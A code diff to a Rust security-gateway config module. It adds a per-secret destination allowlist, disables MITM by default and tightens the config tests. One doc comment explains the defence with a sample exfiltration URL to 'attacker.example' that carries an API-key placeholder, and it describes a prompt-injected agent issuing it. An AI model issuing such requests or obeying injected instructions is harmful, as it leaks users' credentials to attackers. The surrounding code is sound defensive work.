@@ -1,3 +1,5 @@
+use std::collections::HashMap;
+
 use serde::{Deserialize, Serialize};
 
 /// What action to take for a request/response.
@@ -28,7 +30,7 @@ pub struct InjectionReport {
 }
 
 /// Configuration for the security gateway.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
 pub struct GatewayConfig {
     /// Port to listen on (default: 8888; override with SECURITY_PROXY_PORT)
     pub port: u16,
@@ -48,13 +50,43 @@ pub struct GatewayConfig {
     pub bypass_domains: Vec<String>,
     /// Log all traffic (even allowed) for audit
     pub audit_log: bool,
+    /// Per-secret destination allowlist. Keys are secret names (the
+    /// `NAME` from `{{secret:NAME}}`); values are host patterns the
+    /// secret may be substituted into. Patterns follow the same
+    /// host-matching semantics as `bypass_domains`: exact-or-DNS-suffix
+    /// for non-wildcard, glob with `*` matching `[^.]*` (no
+    /// dot-crossing) for wildcard.
+    ///
+    /// Behavior:
+    /// - Secret name absent from the map → no restriction (today's
+    ///   behavior preserved; opt-in tightening).
+    /// - Secret name present with empty list → DENY all destinations
+    ///   (explicit lock-down for secrets you want to disable
+    ///   substitution for entirely).
+    /// - Secret name present with non-empty list → destination host
+    ///   must match at least one pattern, else fail-closed.
+    ///
+    /// Per RFC §11.1 ("substituted-value exfiltration by the upstream
+    /// itself"). Defends against a prompt-injected agent calling
+    /// `https://attacker.example/?key={{secret:ANTHROPIC_API_KEY}}` —
+    /// without an allowlist, the gateway would dutifully substitute
+    /// and exfiltrate.
+    #[serde(default)]
+    pub secret_destination_allowlist: HashMap<String, Vec<String>>,
 }
 
 impl Default for GatewayConfig {
     fn default() -> Self {
+        // MITM defaults to DISABLED because the default CA paths are
+        // None; flipping mitm_enabled=true without a CA would fail at
+        // startup (MITM needs a CA to issue leaf certs). The prior
+        // `true` default was the source of a latent bug the test
+        // `default_config_is_self_consistent_for_mitm` now guards
+        // against. Operators who want MITM set mitm=true AND provide
+        // `ca_cert_path` + `ca_key_path`.
         Self {
             port: 8888,
-            mitm_enabled: true,
+            mitm_enabled: false,
             ca_cert_path: None,
             ca_key_path: None,
             scan_outbound: true,
@@ -67,6 +99,10 @@ impl Default for GatewayConfig {
                 "10.*.*.*".into(),
             ],
             audit_log: true,
+            // Empty by default — preserves current behavior (no secret
+            // is destination-locked). Operators opt in per-secret as
+            // they tighten the deployment.
+            secret_destination_allowlist: HashMap::new(),
         }
     }
 }
@@ -75,44 +111,95 @@ impl Default for GatewayConfig {
 mod tests {
     use super::*;
 
+    /// The default bypass list must include loopback so that the
+    /// gateway doesn't proxy traffic to itself when a local client
+    /// accidentally points at the gateway. This is an invariant, not
+    /// a tautology against hard-coded constants.
     #[test]
-    fn test_default_config() {
+    fn default_bypass_list_includes_loopback() {
         let config = GatewayConfig::default();
-        assert_eq!(config.port, 8888);
-        assert!(config.mitm_enabled);
-        assert!(config.scan_outbound);
-        assert!(config.scan_inbound);
-        assert!(config.inject_credentials);
-        assert!(config.audit_log);
-        assert!(!config.bypass_domains.is_empty());
-    }
-
-    #[test]
-    fn test_config_serialization() {
-        let config = GatewayConfig::default();
-        let json = serde_json::to_string(&config).unwrap();
-        let deserialized: GatewayConfig = serde_json::from_str(&json).unwrap();
-        assert_eq!(config.port, deserialized.port);
-    }
-
-    #[test]
-    fn test_verdict_equality() {
-        assert_eq!(Verdict::Allow, Verdict::Allow);
-        assert_ne!(
-            Verdict::Allow,
-            Verdict::Block {
-                reason: "test".into()
-            }
+        let has_loopback = config
+            .bypass_domains
+            .iter()
+            .any(|d| d == "localhost" || d == "127.0.0.1");
+        assert!(
+            has_loopback,
+            "default bypass list must include a loopback pattern so the \
+             gateway doesn't recurse when misconfigured — got: {:?}",
+            config.bypass_domains
         );
     }
 
+    /// If MITM is enabled but no CA cert/key path is configured, the
+    /// config is non-operational (MITM needs a CA to issue leaf certs).
+    /// The default config must be self-consistent: either mitm=false,
+    /// or both paths are Some. This catches a class of regressions
+    /// where one field is flipped without the other.
     #[test]
-    fn test_verdict_serialization() {
-        let v = Verdict::Block {
-            reason: "exfiltration detected".into(),
+    fn default_config_is_self_consistent_for_mitm() {
+        let config = GatewayConfig::default();
+        let has_ca = config.ca_cert_path.is_some() && config.ca_key_path.is_some();
+        let half_set = config.ca_cert_path.is_some() ^ config.ca_key_path.is_some();
+        assert!(
+            !half_set,
+            "CA cert/key must be both set or both None, never one-of-two: \
+             cert={:?} key={:?}",
+            config.ca_cert_path, config.ca_key_path
+        );
+        if config.mitm_enabled {
+            assert!(
+                has_ca,
+                "mitm_enabled=true requires both ca_cert_path and \
+                 ca_key_path; current default would fail to start"
+            );
+        }
+    }
+
+    /// Structural JSON roundtrip preserves every field. The previous
+    /// test only compared `port`, so adding a field with
+    /// `#[serde(skip_serializing_if)]` or forgetting `Deserialize`
+    /// would slip through silently.
+    #[test]
+    fn config_roundtrips_through_json_preserving_every_field() {
+        let config = GatewayConfig {
+            port: 54321,
+            mitm_enabled: false,
+            ca_cert_path: Some("/tmp/ca.pem".into()),
+            ca_key_path: Some("/tmp/ca.key".into()),
+            scan_outbound: false,
+            scan_inbound: false,
+            inject_credentials: false,
+            bypass_domains: vec!["a.example".into(), "b.example".into()],
+            audit_log: false,
+            secret_destination_allowlist: HashMap::from([
+                ("MY_KEY".into(), vec!["api.example.com".into()]),
+                ("LOCKED".into(), vec![]),
+            ]),
         };
-        let json = serde_json::to_string(&v).unwrap();
-        assert!(json.contains("Block"));
-        assert!(json.contains("exfiltration"));
+        let json = serde_json::to_string(&config).unwrap();
+        let deserialized: GatewayConfig = serde_json::from_str(&json).unwrap();
+        assert_eq!(config, deserialized, "roundtrip must preserve all fields");
+    }
+
+    /// Verdict variants survive JSON roundtrip with structural equality.
+    /// Previously the test used `.contains("Block")` and `.contains("exfiltration")`
+    /// which would pass on any string containing those substrings (e.g. a
+    /// corrupted `{"Blocked":"…"}`).
+    #[test]
+    fn verdict_roundtrips_preserving_each_variant() {
+        let cases = [
+            Verdict::Allow,
+            Verdict::Block {
+                reason: "exfiltration detected".into(),
+            },
+            Verdict::Log {
+                finding: "pii leak".into(),
+            },
+        ];
+        for v in cases {
+            let json = serde_json::to_string(&v).expect("serialize");
+            let back: Verdict = serde_json::from_str(&json).expect("deserialize");
+            assert_eq!(back, v, "variant must roundtrip structurally: {v:?}");
+        }
     }
 }
